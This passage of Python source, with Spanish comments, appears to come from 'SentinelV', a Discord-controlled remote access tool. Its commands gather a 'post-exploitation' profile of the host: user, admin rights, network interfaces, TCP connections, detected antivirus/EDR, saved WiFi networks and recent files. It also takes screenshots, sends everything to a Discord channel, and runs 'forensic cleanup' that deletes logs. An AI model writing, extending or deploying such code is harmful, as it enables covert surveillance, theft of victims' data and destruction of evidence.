                L: List[str] = [SEP, "SENTINEL V  —  HUELLA DIGITAL DEL NODO", SEP,
                    f"Generado   : {close_ts.strftime('%Y-%m-%d %H:%M:%S')}",
                    f"Nodo       : {hostname}",  f"Usuario    : {username}",
                    f"Privilegios: {'ADMINISTRADOR ⚠' if is_admin else 'Usuario estándar'}",
                    f"OS         : {os_info}",   f"Arq.       : {arch}",
                    f"IP local   : {local_ip}",  "",
                    "[ INTERFACES DE RED ]"]
                L += [f"  {n}" for n in net_info] or ["  Sin datos"]
                L += ["","[ CONEXIONES TCP ESTABLECIDAS ]"]
                L += [f"  {c}" for c in tcp_conns[:15]] or ["  Sin conexiones activas"]
                L += ["","[ SEGURIDAD / AV / EDR ]"]
                L += [f"  ⚠  {s}" for s in detected_av] or ["  Sin AV/EDR detectado"]
                L += ["","[ REDES WiFi GUARDADAS ]"]
                L += [f"  📶 {w}" for w in wifi_ssids] or ["  Sin perfiles WiFi"]
                L += ["","[ ARCHIVOS RECIENTES ]"]
                L += [f"  📄 {f}" for f in recent_files] or ["  Sin archivos recientes"]
                L.append(""); L.append(SEP)
                body = "\n".join(L)
                sha  = hashlib.sha256(body.encode("utf-8")).hexdigest()
                L.append(f"SHA-256: {sha}"); L.append(SEP)

                embed = discord.Embed(
                    title="🔬  Huella Digital del Nodo",
                    description="> Perfil completo post-explotación: sistema, red, seguridad, WiFi y archivos recientes.",
                    color=0x8E44AD, timestamp=datetime.utcnow(),
                )
                embed.add_field(name="🖥️  Sistema",
                    value=f"```{hostname} ({username})\n{os_info[:55]}\nPriv: {'ADMIN ⚠' if is_admin else 'Estándar'}  Arq: {arch}```", inline=False)
                if net_info:
                    embed.add_field(name="🌐  Red",
                        value="```"+"\n".join(net_info[:4])+"```", inline=False)
                embed.add_field(name="🛡️  Seguridad",
                    value="\n".join(f"⚠️ {s}" for s in detected_av) if detected_av else "Sin AV/EDR ✅", inline=True)
                if wifi_ssids:
                    embed.add_field(name=f"📶  WiFi ({len(wifi_ssids)})",
                        value="\n".join(f"`{w}`" for w in wifi_ssids[:6]), inline=True)
                if tcp_conns:
                    embed.add_field(name=f"🔗  TCP ({len(tcp_conns)})",
                        value="```"+"\n".join(tcp_conns[:5])+"```", inline=False)
                embed.set_footer(text=f"SentinelV • SHA-256: {sha[:20]}... • {close_ts.strftime('%H:%M:%S')}")

                fname = f"huella_{hostname}_{close_ts.strftime('%Y%m%d_%H%M%S')}.txt"
                buf   = io.BytesIO("\n".join(L).encode("utf-8")); buf.seek(0)
                await ctx.send(embed=embed, file=discord.File(buf, filename=fname))

            except Exception as exc:
                logger.exception("Error en huella_digital: %s", exc)
                await ctx.send(f"Error: {exc}")

        @self.bot.command(name="limpiar_lab", aliases=["gc", "cleanup"])
        async def limpiar_lab(ctx: commands.Context) -> None:
            """Garbage Collection: elimina logs temporales y residuos de compilación."""
            try:
                await ctx.send("🧹 Iniciando limpieza forense del laboratorio...")
                import sys as _sys
                # Detectar raíz del proyecto desde la ruta del ejecutable
                project_root = os.path.dirname(os.path.abspath(_sys.executable))
                summary = await asyncio.to_thread(run_full_gc, project_root)

                embed = discord.Embed(
                    title="🧹  Garbage Collection — Laboratorio Limpio",
                    description="Eliminación de huellas temporales y residuos de compilación completada.",
                    color=0x27AE60,
                    timestamp=datetime.utcnow(),
                )
                embed.add_field(
                    name="📂  Logs temporales eliminados",
                    value=str(summary["temp_logs_cleaned"]),
                    inline=True,
                )
                embed.add_field(
                    name="🔨  Residuos de build eliminados",
                    value=str(summary["build_residues_cleaned"]),
                    inline=True,
                )
                detail_temp  = "\n".join(summary["temp_actions"][:6])  or "Sin archivos temporales."
                detail_build = "\n".join(summary["build_actions"][:6]) or "Sin residuos de build."
                embed.add_field(name="Detalle TEMP",  value=f"```{detail_temp[:400]}```",  inline=False)
                embed.add_field(name="Detalle BUILD", value=f"```{detail_build[:400]}```", inline=False)
                embed.set_footer(text="SentinelV GC • dist/ y .exe principal intactos")
                await ctx.send(embed=embed)
            except Exception as exc:
                logger.exception("Error en limpiar_lab: %s", exc)
                await ctx.send(f"Error: {exc}")

        @self.bot.command(name="resumen_sistema")
        async def resumen_sistema(ctx: commands.Context) -> None:
            try:
                await ctx.send("Generando snapshot ejecutivo del sistema...")
                summary = await asyncio.to_thread(self._build_system_summary)
                embed = self._render_summary_embed(summary)
                screenshot_data = await asyncio.to_thread(take_screenshot, "PNG")
                screenshot_data.seek(0)
                file = discord.File(screenshot_data, filename="resumen_sistema.png")
                embed.set_thumbnail(url="attachment://resumen_sistema.png")
                await ctx.send(embed=embed, file=file)
            except Exception as exc:
                logger.exception("Error en resumen_sistema: %s", exc)
                await ctx.send(f"Error: {exc}")

    def _run_bot_loop(self) -> None:
        """Ejecuta el bot en su propio event loop en un thread."""
        self._event_loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self._event_loop)
        try:
            self._event_loop.run_until_complete(self.bot.start(self.bot_token))
        except Exception as exc:
            logger.exception("Error en el loop del bot: %s", exc)
        finally:
            if not self._event_loop.is_closed():
                self._event_loop.close()

    def run(self) -> None:
        """Inicia el bot en un thread daemon para no bloquear el caller."""
        if self._bot_thread is not None:
            logger.warning("CommandOrchestrator ya está ejecutándose")
            return
        
        self._bot_thread = threading.Thread(
            target=self._run_bot_loop,
            daemon=True,
        )
        self._bot_thread.start()
        logger.info("CommandOrchestrator iniciado en thread daemon")

    def stop(self) -> None:
        """Detiene el bot de forma segura."""
        try:
            if self._event_loop is not None and hasattr(self.bot, "close"):
                asyncio.run_coroutine_threadsafe(self.bot.close(), self._event_loop)
            if hasattr(self, "_activity_tracker"):
                try:
                    self._activity_tracker.stop()
                except Exception:
                    pass
            logger.info("CommandOrchestrator detenido")
        except Exception as exc:
            logger.warning("Error al detener CommandOrchestrator: %s", exc)
